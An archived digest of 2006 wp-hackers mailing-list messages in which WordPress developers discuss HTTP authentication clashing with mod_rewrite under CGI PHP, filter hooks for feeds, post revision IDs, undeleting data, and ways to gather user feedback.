Message-ID: <4cba61b90602130928h45ed9986jf007a0728a787094@mail.gmail.com>

On 2/13/06, Gopalarathnam Venkatesan <gopal@gopalarathnam.com> wrote:
> On 2/13/06, Evan Broder <wp@ebroder.net> wrote:
> > Is anybody still looking at this - http://trac.wordpress.org/ticket/2397?
> >
> > I've been trying to hack around the .htaccess file, but I don't know
> > mod_rewrite well enough to do anything about it.
> >
> > - Evan
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers@lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
>
> May be I'll try this tonight :)
>

Is this fixed already in the latest CVS branch?  I'm not able to
reproduce this in my local installation.


--
Gopalarathnam Venkatesan
http://gopalarathnam.com/
From powzor at gmail.com  Mon Feb 13 17:57:04 2006
From: powzor at gmail.com (Rob)
Date: Mon Feb 13 17:57:41 2006
Subject: [wp-hackers] Filter Hooks for Enclosures
In-Reply-To: <43F0C00D.3090801@midnightcircus.com>
References: <000201c630b2$4293c410$6802a8c0@kergan>	<43F0BAB8.6040904@midnightcircus.com>	<43F0BADB.4010809@jrm.cc>
	<43F0C00D.3090801@midnightcircus.com>
Message-ID: <43F0C870.1010700@robm.me.uk>

Owen Winkler wrote:
> Jeff Minard wrote:
>> Owen Winkler wrote:
>>> $xml = ob_get_clean();
>>> $feed = new WPXmlDoc($xml);
>>
>> There's a nightmare of a function ;)
>
> I was hoping nobody would notice that.  :)
>
> Actually, that's where the libraries I was suggesting come into play. 
> There are a couple that will parse XML down into an array or a set of 
> manageable PHP objects.  These can then be modified in code (rather 
> than manipulating strings and inserting doaction()s between every code 
> line) and output with a single $feed->output();
>
> That's the advantage.
>
> Otherwise, how can we satisfy every need to modify these feeds, since 
> they're not in editable space (wp-content)?
>
> Owen
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
What are the best libraries for this, though? SimpleXML is fantastic but 
PHP5 only, and the PEAR XML_(Un)Serializer class has been (in my 
experience, anyway) pretty bad.

-- 
Rob Miller
http://robm.me.uk/ | http://kantian.co.uk/

From wp at ebroder.net  Mon Feb 13 18:03:13 2006
From: wp at ebroder.net (Evan Broder)
Date: Mon Feb 13 18:04:57 2006
Subject: [wp-hackers] HTTP Auth/URL Rewriting
In-Reply-To: <4cba61b90602130928h45ed9986jf007a0728a787094@mail.gmail.com>
References: <43EF819B.5040207@ebroder.net>	<4cba61b90602130118s3afefdabwb7439e716fe62b28@mail.gmail.com>
	<4cba61b90602130928h45ed9986jf007a0728a787094@mail.gmail.com>
Message-ID: <43F0C9E1.1040408@ebroder.net>

Gopalarathnam Venkatesan wrote:
> Is this fixed already in the latest CVS branch?  I'm not able to
> reproduce this in my local installation.
>
>
> --
> Gopalarathnam Venkatesan
> http://gopalarathnam.com/
>   
The issue only seems to come up when PHP is running as a CGI. Looking 
through the source code, I can't find anything about the .htaccess file 
that's output that has changed.

- Evan
From davebytes at comcast.net  Mon Feb 13 18:22:48 2006
From: davebytes at comcast.net (David Chait)
Date: Mon Feb 13 18:24:28 2006
Subject: [wp-hackers] Filter Hooks for Enclosures
References: <a0159cd30602130122o50958aa9tcf9606dd808a7e7f@mail.gmail.com><43F08328.9050900@jamietalbot.com><43F09120.1000907@midnightcircus.com><09d201c630b0$4ff261e0$6e01a8c0@sixfour>
	<ebe43d680602130821u522b8d3cp@mail.gmail.com>
Message-ID: <0a1901c630ca$7f09e600$6e01a8c0@sixfour>

Didn't say it wasn't a sizeable library.  But we're talking about going from 
a fixed file per feed type to pretty much any feed type desired (well, 
that's been coded) via one translation call.  And I don't see how FC is 
going to be that significantly heavier-weight than whatever brand-new stuff 
Owen is dreaming about -- and FC is already established, used, tested., 
etc... ;)

Also, with WP-Cache in place, feeds would only be generated every N hours 
anyway, so I'm not (personally) concerned about overhead (we are talking 
about a bigger future version here...).

-d

----- Original Message ----- 
From: "David House" <dmhouse@gmail.com>
To: <wp-hackers@lists.automattic.com>
Sent: Monday, February 13, 2006 11:21 AM
Subject: Re: [wp-hackers] Filter Hooks for Enclosures


On 13/02/06, David Chait <davebytes@comcast.net> wrote:
> There have been multiple calls here (in two threads) to switch over to
> something like FeedCreator for maintaining the various feed formats.  Alex
> presented FeedCreator originally, I gave it a +1, and in a separate thread
> Mark and Kimmo basically both gave it approval as well (Kimmo uses it
> already...).  FC looks like it uses the create-in-php,
> output-in-whatever-format approach.

It's also a _lot_ of code (several hundred lines worth) that would
replace the mostly functional ~70 lines of code for feeds as present.


From lists at alexking.org  Mon Feb 13 18:52:02 2006
From: lists at alexking.org (Alex King)
Date: Mon Feb 13 18:53:45 2006
Subject: [wp-hackers] HTTP Auth/URL Rewriting
In-Reply-To: <43F0C9E1.1040408@ebroder.net>
References: <43EF819B.5040207@ebroder.net>	<4cba61b90602130118s3afefdabwb7439e716fe62b28@mail.gmail.com>
	<4cba61b90602130928h45ed9986jf007a0728a787094@mail.gmail.com>
	<43F0C9E1.1040408@ebroder.net>
Message-ID: <A0454DA3-A008-4EDE-A024-0F9305BEE3FF@alexking.org>

PHP as a CGI (in the default configuration) is a problem for 401 auth  
with PHP. The 401 auth information doesn't get passed to the PHP  
runtime. There are work-arounds for this, I believe the TextDrive  
guys have something cooked up for it, but they are server  
configuration solutions (not something WP can implement).

Cheers,
--Alex

Personal             Business               FeedLounge
http://alexking.org  http://kingdesign.net  http://feedlounge.com


On Feb 13, 2006, at 11:03 AM, Evan Broder wrote:
> The issue only seems to come up when PHP is running as a CGI.  
> Looking through the source code, I can't find anything about  
> the .htaccess file that's output that has changed.
From wp at ebroder.net  Mon Feb 13 19:07:50 2006
From: wp at ebroder.net (Evan Broder)
Date: Mon Feb 13 19:09:30 2006
Subject: [wp-hackers] HTTP Auth/URL Rewriting
In-Reply-To: <A0454DA3-A008-4EDE-A024-0F9305BEE3FF@alexking.org>
References: <43EF819B.5040207@ebroder.net>	<4cba61b90602130118s3afefdabwb7439e716fe62b28@mail.gmail.com>	<4cba61b90602130928h45ed9986jf007a0728a787094@mail.gmail.com>	<43F0C9E1.1040408@ebroder.net>
	<A0454DA3-A008-4EDE-A024-0F9305BEE3FF@alexking.org>
Message-ID: <43F0D906.6020501@ebroder.net>

Alex King wrote:
> PHP as a CGI (in the default configuration) is a problem for 401 auth 
> with PHP. The 401 auth information doesn't get passed to the PHP 
> runtime. There are work-arounds for this, I believe the TextDrive guys 
> have something cooked up for it, but they are server configuration 
> solutions (not something WP can implement).
>
> Cheers,
> --Alex
>
> Personal             Business               FeedLounge
> http://alexking.org  http://kingdesign.net  http://feedlounge.com
The issue isn't in WP itself. The problem is that WP is intercepting any 
other directory that's supposed to be protected.

That is, if I protect a directory that's within the WP root with 
.htaccess basic authentication and all that good stuff, requesting it 
returns a WP 404 error.

I have discovered that if I send the appropriate authentication headers 
with the request (i.e. a username/pass), WP doesn't intercept that. 
Since I leave my browser open all the time, I just disabled the WP 
mod_rewrite commands for a second, logged in to the directory, and 
turned the mod_rewrite stuff back on.

But that's really a crummy solution.

- Evan
From skeltoac at gmail.com  Mon Feb 13 20:43:56 2006
From: skeltoac at gmail.com (Andy Skelton)
Date: Mon Feb 13 20:45:38 2006
Subject: [wp-hackers] Forum Usefulness (was Data recovery)
In-Reply-To: <43EF5FB5.8000803@skippy.net>
References: <43EE5465.1090502@tamba2.org.uk>
	<ebe43d680602111337l1c8f285aw@mail.gmail.com>
	<20060211214445.GK1070@kimmo.suominen.com>
	<007501c62f57$9754b8d0$6e01a8c0@sixfour>
	<ebe43d680602120211g681b3a23t@mail.gmail.com>
	<F1FD6659-70EC-4E6C-91F9-D2CC48DF1089@txfx.net>
	<ebe43d680602120426u20523b8m@mail.gmail.com>
	<43EF397C.2040600@skippy.net> <001301c62fea$b1ef71b0$6e01a8c0@sixfour>
	<43EF5FB5.8000803@skippy.net>
Message-ID: <e6ec604d0602131243p6c9f1540m7a8343716c578313@mail.gmail.com>

On 2/12/06, Scott Merrill <skippy@skippy.net> wrote:
> Yeah, it's a darn shame that so few people participating in this list
> see any kind of overview of common support / feature requests submitted
> directly to the wordpress.com power structure.  Maybe a lot of these
> arguments would be averted if this information were made (more) public,
> or summarized in some meaningful way (a la the Google zietgeists, or
> Sifry's quarterly summaries).

I read just about every feedback from wordpress.com users and I'd be
happy to summarize them for you. In order of frequency:

1.a. Thanks for the great blogging platform
1.b. You guys rock
2.a. Please add ________ (feature available in existing themes)
2.b. Please add ________ (feature available in existing plugins)
3. Please help me ________ (something they couldn't figure out)

For item 1, the credit (and blame) belongs with everyone who helps
develop WordPress, which includes many of you on wp-hackers. We can't
forward all the kudos to wp-hackers but trust me, you'd switch to
digest mode within a couple of hours and unsubscribe within a week.
It's really a lot of good feedback.

Item 2 does not need to be seen or addressed by this list. It boils
down to requests to edit templates and upload plugins, which of course
they can do if they host their own.

Item 3 is addressed in personal emails and posts in faq.wordpress.com.
The most common items here deal with WPMU-specific issues: managing
multiple blogs, stuff like that.

A small subset of 3 deals with WordPress core issues, almost all of
which are complaints that can be or have been resolved by streamlining
the management interface.

You want to know the specifics? The common complaints and suggestions
are seen even more frequently at wordpress.com/forums than they are in
the feedback form. All you have to do to get the specifics is spend a
little time in there. It's rather like .org/forums in that respect.

Andy
From jeff at jrm.cc  Mon Feb 13 20:49:41 2006
From: jeff at jrm.cc (Jeff Minard)
Date: Mon Feb 13 20:51:29 2006
Subject: [wp-hackers] post_status == previous
In-Reply-To: <a491f91d0602130926i3ab14589y5a49a48fb4ee76bb@mail.gmail.com>
References: <43EE5465.1090502@tamba2.org.uk>	<20060211214445.GK1070@kimmo.suominen.com>	<007501c62f57$9754b8d0$6e01a8c0@sixfour>	<ebe43d680602120211g681b3a23t@mail.gmail.com>	<F1FD6659-70EC-4E6C-91F9-D2CC48DF1089@txfx.net>	<ebe43d680602120426u20523b8m@mail.gmail.com>	<001801c62feb$42812de0$6e01a8c0@sixfour>	<008001c62ff3$6e2d51a0$6402a8c0@DELL8600>	<003301c62ff5$ac4b5930$6e01a8c0@sixfour>
	<43F0B7E1.40901@jrm.cc>
	<a491f91d0602130926i3ab14589y5a49a48fb4ee76bb@mail.gmail.com>
Message-ID: <43F0F0E5.6040206@jrm.cc>

Robert Deaton wrote:
> This is completely out of the question, as in order to do this, you
> have to insert a new post for each revision, and change the old
> revision to previous. This means that you just broke permalinks, and
> in order to keep permalinks working, you need an extra column in the
> field and need to do selects to traverse up to the latest revision of
> the post.

Ooorrrr, you could change the id on the "previous" version to whatever 
is next available and insert the "publish" version with the old id. 
That'd not break anything.

Tracking the "revisions" would, as you point out, be difficult. You'd 
need some way to link "this used to be 1,2,4,6" -- a post meta array of 
the "previous" id's might do that well enough.

Jeff
From skeltoac at gmail.com  Mon Feb 13 21:03:42 2006
From: skeltoac at gmail.com (Andy Skelton)
Date: Mon Feb 13 21:05:25 2006
Subject: [wp-hackers] HTTP Auth/URL Rewriting
In-Reply-To: <43F0D906.6020501@ebroder.net>
References: <43EF819B.5040207@ebroder.net>
	<4cba61b90602130118s3afefdabwb7439e716fe62b28@mail.gmail.com>
	<4cba61b90602130928h45ed9986jf007a0728a787094@mail.gmail.com>
	<43F0C9E1.1040408@ebroder.net>
	<A0454DA3-A008-4EDE-A024-0F9305BEE3FF@alexking.org>
	<43F0D906.6020501@ebroder.net>
Message-ID: <e6ec604d0602131303k5a6ece97rda60d461663d6a7f@mail.gmail.com>

On 2/13/06, Evan Broder <wp@ebroder.net> wrote:
> I have discovered that if I send the appropriate authentication headers
> with the request (i.e. a username/pass), WP doesn't intercept that.

Just thinking atext here... how about a mod_rewrite rule (above the WP
rules) sending your no-auth requests to a php script that returns the
proper status code and auth challenge?

Andy
From nuclearmoose at gmail.com  Mon Feb 13 21:06:29 2006
From: nuclearmoose at gmail.com (Craig)
Date: Mon Feb 13 21:08:10 2006
Subject: [wp-hackers] post_status == previous
In-Reply-To: <43F0F0E5.6040206@jrm.cc>
References: <43EE5465.1090502@tamba2.org.uk>
	<ebe43d680602120211g681b3a23t@mail.gmail.com>
	<F1FD6659-70EC-4E6C-91F9-D2CC48DF1089@txfx.net>
	<ebe43d680602120426u20523b8m@mail.gmail.com>
	<001801c62feb$42812de0$6e01a8c0@sixfour>
	<008001c62ff3$6e2d51a0$6402a8c0@DELL8600>
	<003301c62ff5$ac4b5930$6e01a8c0@sixfour> <43F0B7E1.40901@jrm.cc>
	<a491f91d0602130926i3ab14589y5a49a48fb4ee76bb@mail.gmail.com>
	<43F0F0E5.6040206@jrm.cc>
Message-ID: <5aa3aa0602131306s6ae8c034la9ea919c097ecae5@mail.gmail.com>

What if a post id number was assigned and it stayed with that post
regardless of what happens to it? In other words, every single post gets a
unique id number, period.

At work we are currently suffering the consequences of old "dead" objects
which had been deleted from our database but in subsequent uses, the "old,
dead" id was re-used. OMG, what a headache.

Craig.
From wp at ebroder.net  Mon Feb 13 21:08:06 2006
From: wp at ebroder.net (Evan Broder)
Date: Mon Feb 13 21:09:42 2006
Subject: [wp-hackers] HTTP Auth/URL Rewriting
In-Reply-To: <e6ec604d0602131303k5a6ece97rda60d461663d6a7f@mail.gmail.com>
References: <43EF819B.5040207@ebroder.net>	<4cba61b90602130118s3afefdabwb7439e716fe62b28@mail.gmail.com>	<4cba61b90602130928h45ed9986jf007a0728a787094@mail.gmail.com>	<43F0C9E1.1040408@ebroder.net>	<A0454DA3-A008-4EDE-A024-0F9305BEE3FF@alexking.org>	<43F0D906.6020501@ebroder.net>
	<e6ec604d0602131303k5a6ece97rda60d461663d6a7f@mail.gmail.com>
Message-ID: <43F0F536.8010809@ebroder.net>

Andy Skelton wrote:
> Just thinking atext here... how about a mod_rewrite rule (above the WP
> rules) sending your no-auth requests to a php script that returns the
> proper status code and auth challenge?
>
> Andy
>   
Or some way to completely disable the mod_rewriting in that scenario. 
But, alas, I haven't found the magic set of options that will do that.
From peter.westwood at ftwr.co.uk  Mon Feb 13 21:24:29 2006
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Mon Feb 13 21:26:05 2006
Subject: [wp-hackers] Filter Hooks for Enclosures
In-Reply-To: <43F0BAB8.6040904@midnightcircus.com>
References: <000201c630b2$4293c410$6802a8c0@kergan>
	<43F0BAB8.6040904@midnightcircus.com>
Message-ID: <43F0F90D.7080809@ftwr.co.uk>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Owen Winkler wrote:
> Denis de Bernardy wrote:
>>> There are some extant implementations of Object<->XML in PHP, so it
>>> might not be too difficult a conversion.  Manipulating the feed XML
>>> via DOM in a plugin would be swell.
>>>
>>> Before I continue blathering about this, how much does this idea suck?
>>
>> DOM/XML related stuff is far from being installed properly on most hosts,
>> and does not work the same in php4 and php5. I'd use a straightforward
>> array
>> instead.
> 
> That's really more what I was suggesting.
> 
> There must be some class that would let us do something like this:
> 
> ob_start();
> // Existing feed stuff
> $xml = ob_get_clean();
> $feed = new WPXmlDoc($xml);
> $feed = apply_filters('feed_xml', $feed);
> $feed->output();
> 
> ...
> 
> add_filter('feed_xml', 'my_feed_xml');
> function my_feed_xml($feed)
> {
>     $feed->data['rss'][0]['customtag'][0] = 'test';
>     return $feed;
> }
> 
> Or something.
> 

Why not just makes feeds template items so that a user theme can have an
 rss template for example rss.php, atom.php etc. and this is used
instead of the builtin feed handler.

If we standardise on hooks for the main places a plugin would want to
add and let the enduser extend some more if necessary.

This allows people to customise feeds to any degree without having to
muck around with object buffers and building/throwing away huge object
structures for every feed request.

westi
- --
Peter Westwood
http://blog.ftwr.co.uk
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.2 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org

iD8DBQFD8PkNVPRdzag0AcURAq/UAJ4xRqnBytO6z+YlnX9qzqdyygw3TQCgo8ZF
VRoL1Z3ozz3u7U7ju7kbJuk=
=C/Ve
-----END PGP SIGNATURE-----

From wp at ebroder.net  Mon Feb 13 21:27:36 2006
From: wp at ebroder.net (Evan Broder)
Date: Mon Feb 13 21:30:20 2006
Subject: [wp-hackers] post_status == previous
In-Reply-To: <5aa3aa0602131306s6ae8c034la9ea919c097ecae5@mail.gmail.com>
References: <43EE5465.1090502@tamba2.org.uk>	<ebe43d680602120211g681b3a23t@mail.gmail.com>	<F1FD6659-70EC-4E6C-91F9-D2CC48DF1089@txfx.net>	<ebe43d680602120426u20523b8m@mail.gmail.com>	<001801c62feb$42812de0$6e01a8c0@sixfour>	<008001c62ff3$6e2d51a0$6402a8c0@DELL8600>	<003301c62ff5$ac4b5930$6e01a8c0@sixfour>
	<43F0B7E1.40901@jrm.cc>	<a491f91d0602130926i3ab14589y5a49a48fb4ee76bb@mail.gmail.com>	<43F0F0E5.6040206@jrm.cc>
	<5aa3aa0602131306s6ae8c034la9ea919c097ecae5@mail.gmail.com>
Message-ID: <43F0F9C8.4010306@ebroder.net>

Craig wrote:
> What if a post id number was assigned and it stayed with that post
> regardless of what happens to it? In other words, every single post 
> gets a
> unique id number, period.
>
> At work we are currently suffering the consequences of old "dead" objects
> which had been deleted from our database but in subsequent uses, the 
> "old,
> dead" id was re-used. OMG, what a headache.
>
> Craig
Sounds like a lot of fun. I didn't know any databases reused keys.

Anyway, in a wiki sort of setup, I think the current version of a post 
should always retain its current ID. Old versions would be appended to 
the end of the table.

e.g.:
I save a post as a draft, it gets an ID of 2.
I then make some more changes. The original version gets a new ID of 5, 
but the current draft stays at 2.

If you don't do that, you're going to run into all kinds of screwiness 
with comments and the like.

But, I agree that this sort of thing should be implemented as a plugin, 
although there's no reason that plugin couldn't be included with the 
standard distribution.

- Evan
From grijalva at gmail.com  Mon Feb 13 21:34:52 2006
From: grijalva at gmail.com (Dave Grijalva)
Date: Mon Feb 13 21:36:34 2006
Subject: [wp-hackers] Filter Hooks for Enclosures
In-Reply-To: <43F0F90D.7080809@ftwr.co.uk>
References: <000201c630b2$4293c410$6802a8c0@kergan>
	<43F0BAB8.6040904@midnightcircus.com> <43F0F90D.7080809@ftwr.co.uk>
Message-ID: <a0159cd30602131334v1bd7047ar40497ecd0a3bdb54@mail.gmail.com>

I don't really know if all that is necessary.  A lot could be done by just
tossing in some filter hooks here that are feed specific.  Like being able
to modify the link string, or the enclosure url, etc.  Being able to modify
a feed template would be nice, but there is a large potential there for
people to start breaking their feeds.  A lot can be done with the plugin api
that will make it safer for users to modify things by allowing someone else
to do the heavy lifting.

-dave

On 2/13/06, Peter Westwood <peter.westwood@ftwr.co.uk> wrote:
>
> -----BEGIN PGP SIGNED MESSAGE-----
> Hash: SHA1
>
> Owen Winkler wrote:
> > Denis de Bernardy wrote:
> >>> There are some extant implementations of Object<->XML in PHP, so it
> >>> might not be too difficult a conversion.  Manipulating the feed XML
> >>> via DOM in a plugin would be swell.
> >>>
> >>> Before I continue blathering about this, how much does this idea suck?
> >>
> >> DOM/XML related stuff is far from being installed properly on most
> hosts,
> >> and does not work the same in php4 and php5. I'd use a straightforward
> >> array
> >> instead.
> >
> > That's really more what I was suggesting.
> >
> > There must be some class that would let us do something like this:
> >
> > ob_start();
> > // Existing feed stuff
> > $xml = ob_get_clean();
> > $feed = new WPXmlDoc($xml);
> > $feed = apply_filters('feed_xml', $feed);
> > $feed->output();
> >
> > ...
> >
> > add_filter('feed_xml', 'my_feed_xml');
> > function my_feed_xml($feed)
> > {
> >     $feed->data['rss'][0]['customtag'][0] = 'test';
> >     return $feed;
> > }
> >
> > Or something.
> >
>
> Why not just makes feeds template items so that a user theme can have an
> rss template for example rss.php, atom.php etc. and this is used
> instead of the builtin feed handler.
>
> If we standardise on hooks for the main places a plugin would want to
> add and let the enduser extend some more if necessary.
>
> This allows people to customise feeds to any degree without having to
> muck around with object buffers and building/throwing away huge object
> structures for every feed request.
>
> westi
> - --
> Peter Westwood
> http://blog.ftwr.co.uk
> -----BEGIN PGP SIGNATURE-----
> Version: GnuPG v1.4.2 (MingW32)
> Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
>
> iD8DBQFD8PkNVPRdzag0AcURAq/UAJ4xRqnBytO6z+YlnX9qzqdyygw3TQCgo8ZF
> VRoL1Z3ozz3u7U7ju7kbJuk=
> =C/Ve
> -----END PGP SIGNATURE-----
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
From dmhouse at gmail.com  Mon Feb 13 21:40:36 2006
From: dmhouse at gmail.com (David House)
Date: Mon Feb 13 21:42:21 2006
Subject: [wp-hackers] Filter Hooks for Enclosures
In-Reply-To: <a0159cd30602131334v1bd7047ar40497ecd0a3bdb54@mail.gmail.com>
References: <000201c630b2$4293c410$6802a8c0@kergan>
	<43F0BAB8.6040904@midnightcircus.com> <43F0F90D.7080809@ftwr.co.uk>
	<a0159cd30602131334v1bd7047ar40497ecd0a3bdb54@mail.gmail.com>
Message-ID: <ebe43d680602131340s5490946aq@mail.gmail.com>

On 13/02/06, Dave Grijalva <grijalva@gmail.com> wrote:
> I don't really know if all that is necessary.  A lot could be done by just
> tossing in some filter hooks here that are feed specific.  Like being able
> to modify the link string, or the enclosure url, etc.  Being able to modify
> a feed template would be nice, but there is a large potential there for
> people to start breaking their feeds.  A lot can be done with the plugin api
> that will make it safer for users to modify things by allowing someone else
> to do the heavy lifting.

+1

I think that with enough template tags we can make creating new feeds
easy. With enough hooks, we can make editing existing ones easy as
well. No need to add to WP's already large core.

--
-David House, dmhouse@gmail.com, http://xmouse.ithium.net
From jeff at jrm.cc  Tue Feb 14 00:03:43 2006
From: jeff at jrm.cc (Jeff Minard)
Date: Tue Feb 14 00:05:34 2006
Subject: [wp-hackers] post_status == previous
In-Reply-To: <43F0F9C8.4010306@ebroder.net>
References: <43EE5465.1090502@tamba2.org.uk>	<ebe43d680602120211g681b3a23t@mail.gmail.com>	<F1FD6659-70EC-4E6C-91F9-D2CC48DF1089@txfx.net>	<ebe43d680602120426u20523b8m@mail.gmail.com>	<001801c62feb$42812de0$6e01a8c0@sixfour>	<008001c62ff3$6e2d51a0$6402a8c0@DELL8600>	<003301c62ff5$ac4b5930$6e01a8c0@sixfour>	<43F0B7E1.40901@jrm.cc>	<a491f91d0602130926i3ab14589y5a49a48fb4ee76bb@mail.gmail.com>	<43F0F0E5.6040206@jrm.cc>	<5aa3aa0602131306s6ae8c034la9ea919c097ecae5@mail.gmail.com>
	<43F0F9C8.4010306@ebroder.net>
Message-ID: <43F11E5F.300@jrm.cc>

Evan Broder wrote:
> I save a post as a draft, it gets an ID of 2.
> I then make some more changes. The original version gets a new ID of 5, 
> but the current draft stays at 2.

Precisely how I was suggesting it ;)

Jeff
From grijalva at gmail.com  Tue Feb 14 02:35:08 2006
From: grijalva at gmail.com (Dave Grijalva)
Date: Tue Feb 14 02:36:51 2006
Subject: [wp-hackers] Filter Hooks for Enclosures
In-Reply-To: <ebe43d680602131340s5490946aq@mail.gmail.com>
References: <000201c630b2$4293c410$6802a8c0@kergan>
	<43F0BAB8.6040904@midnightcircus.com> <43F0F90D.7080809@ftwr.co.uk>
	<a0159cd30602131334v1bd7047ar40497ecd0a3bdb54@mail.gmail.com>
	<ebe43d680602131340s5490946aq@mail.gmail.com>
Message-ID: <a0159cd30602131835v9c75e29lf0071e175611b818@mail.gmail.com>

I agree with that.  I'm just looking for some hooks.

In the meantime, I'd like to be able to make my plugin work without any
modification to the wp source.  Are there any hooks available for the
beginning and end of a feed generation?

-dave

On 2/13/06, David House <dmhouse@gmail.com> wrote:
>
> On 13/02/06, Dave Grijalva <grijalva@gmail.com> wrote:
> > I don't really know if all that is necessary.  A lot could be done by
> just
> > tossing in some filter hooks here that are feed specific.  Like being
> able
> > to modify the link string, or the enclosure url, etc.  Being able to
> modify
> > a feed template would be nice, but there is a large potential there for
> > people to start breaking their feeds.  A lot can be done with the plugin
> api
> > that will make it safer for users to modify things by allowing someone
> else
> > to do the heavy lifting.
>
> +1
>
> I think that with enough template tags we can make creating new feeds
> easy. With enough hooks, we can make editing existing ones easy as
> well. No need to add to WP's already large core.
>
> --
> -David House, dmhouse@gmail.com, http://xmouse.ithium.net
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
From m at mullenweg.com  Tue Feb 14 06:49:17 2006
From: m at mullenweg.com (Matt Mullenweg)
Date: Tue Feb 14 06:51:48 2006
Subject: [wp-hackers] Data recovery (post_status?)
In-Reply-To: <006001c62ff2$45cece10$6402a8c0@DELL8600>
References: <43EE5465.1090502@tamba2.org.uk>	<ebe43d680602111337l1c8f285aw@mail.gmail.com>	<20060211214445.GK1070@kimmo.suominen.com>	<007501c62f57$9754b8d0$6e01a8c0@sixfour>	<ebe43d680602120211g681b3a23t@mail.gmail.com>	<F1FD6659-70EC-4E6C-91F9-D2CC48DF1089@txfx.net><ebe43d680602120426u20523b8m@mail.gmail.com><43EF397C.2040600@skippy.net>	<001301c62fea$b1ef71b0$6e01a8c0@sixfour>
	<006001c62ff2$45cece10$6402a8c0@DELL8600>
Message-ID: <43F17D6D.3000303@mullenweg.com>

Michael E. Hancock wrote:
> There's some irony here because it was an accidental deletion of a post in
> the Forums by one of the ops that seemed to get this whole thread started.

More irony!

When I wrote bbPress it was from scratch so it never actually deleted 
anything. I'm not sure if it's exposed in the UI properly, but if you 
ping me with the thread ID I can bring it back. Someone like Podz should 
also be able to do it in the bbPress admin interface.

That said, I think the usage patterns of forums with lots of (possibly) 
untrusted moderators is very different from that of blogs.

In WP most "delete" buttons turn red (first flag) and have a popup 
warning that isn't used anywhere else in the program (flag two). I think 
this is sufficient. Sometimes users really want delete. (Remember all 
the complaints about Gmail when it came out without a delete button?)

For truly catastrophic failures we've always had backups.

Short of versioning every field in WP, including categories, meta 
fields, user info, passwords, etc, I think implementing a half-assed 
"universal undo" is worse than none at all. Furthermore, this is more 
the realm of a plugin for the ultra-paranoid rather than adding enormous 
complexity to WP for a single unlikely edge case.

That said, in a plugin maybe someone could do a DB dump after every 
write or update operation and then SVN commit the file, so a true 
rollback of WP would be possible. Since only diffs would be stored it 
wouldn't take up much space, and you'd have the robustness of SVN to 
tag/branch/revert the entire DB. (And possibly WP itself?)

-- 
Matt Mullenweg
  http://photomatt.net | http://wordpress.org
http://automattic.com | http://akismet.com
From podz at tamba2.org.uk  Tue Feb 14 06:59:27 2006
From: podz at tamba2.org.uk (Podz)
Date: Tue Feb 14 07:00:44 2006
Subject: [wp-hackers] Data recovery (post_status?)
In-Reply-To: <43F17D6D.3000303@mullenweg.com>
References: <43EE5465.1090502@tamba2.org.uk>	<ebe43d680602111337l1c8f285aw@mail.gmail.com>	<20060211214445.GK1070@kimmo.suominen.com>	<007501c62f57$9754b8d0$6e01a8c0@sixfour>	<ebe43d680602120211g681b3a23t@mail.gmail.com>	<F1FD6659-70EC-4E6C-91F9-D2CC48DF1089@txfx.net><ebe43d680602120426u20523b8m@mail.gmail.com><43EF397C.2040600@skippy.net>	<001301c62fea$b1ef71b0$6e01a8c0@sixfour>	<006001c62ff2$45cece10$6402a8c0@DELL8600>
	<43F17D6D.3000303@mullenweg.com>
Message-ID: <43F17FCF.60803@tamba2.org.uk>

Matt Mullenweg wrote:

> In WP most "delete" buttons turn red (first flag) and have a popup
> warning that isn't used anywhere else in the program (flag two). I think
> this is sufficient. Sometimes users really want delete.

And sometimes it's an accident or in the case of a multi-author blog a
disgruntled user.
Just posts and comments ?

P.
From m at mullenweg.com  Tue Feb 14 07:05:42 2006
From: m at mullenweg.com (Matt Mullenweg)
Date: Tue Feb 14 07:08:08 2006
Subject: [wp-hackers] Forum Usefulness (was Data recovery)
In-Reply-To: <43EF5FB5.8000803@skippy.net>
References: <43EE5465.1090502@tamba2.org.uk>	<ebe43d680602111337l1c8f285aw@mail.gmail.com>	<20060211214445.GK1070@kimmo.suominen.com>	<007501c62f57$9754b8d0$6e01a8c0@sixfour>	<ebe43d680602120211g681b3a23t@mail.gmail.com>	<F1FD6659-70EC-4E6C-91F9-D2CC48DF1089@txfx.net><ebe43d680602120426u20523b8m@mail.gmail.com>	<43EF397C.2040600@skippy.net>	<001301c62fea$b1ef71b0$6e01a8c0@sixfour>
	<43EF5FB5.8000803@skippy.net>
Message-ID: <43F18146.1080506@mullenweg.com>

Scott Merrill wrote:
> Yeah, it's a darn shame that so few people participating in this list
> see any kind of overview of common support / feature requests submitted
> directly to the wordpress.com power structure.  Maybe a lot of these
> arguments would be averted if this information were made (more) public,
> or summarized in some meaningful way (a la the Google zietgeists, or
> Sifry's quarterly summaries).

Other good ways to follow the pulse of feedback:

* Subscibe to a "wordpress" search on Technorati, Pubsub, etc
* Same for "wordpress" tag
* Read all ping/trackbacks to the dev blog
* Read the WP.com forums
* Read the WP.org forums

I wouldn't recommend purely mailing lists or IRC because the perspective 
there is often highly skewed from the general public.

I've toyed with the idea of making all the feedback sent public, but 
some people send private messages in the feedback form as well. Maybe a 
checkbox to say "[ ] Post to forums".

Other ideas:

* Search logging
* Most popular codex and FAQ pages
* Daily tag summaries, to get an idea of "hot topics"
* Watching computer illiterate people try WP
* Host a bunch of blogs for friends, see what they say
* Write a plugin/theme, look for patterns in support requests
* Correlate topics to resolved/unresolved threads
* Correlate topics to thread length
* Track adoption and download rate over time
* A/B testing on a large install like WP.com
* Mouse tracking, time spent on each page

Anyway just to cheer things up, here's some feedback we got the other 
day. It's actually pretty fun:

"Your software is really a treat
Creating such a software is no mean feat
Any blogger would be upbeat
However you have to beat
The problem of multiple comments delete
I think because of excess traffic you are feeling the heat.
Don't worry, without teething troubles, no innovation is complete.
I must repeate
Such problems you have to defeat
Vis-a-vis, honest feedback, other problems must take a backseat."

I think all future feature requests in Trac should rhyme. :)

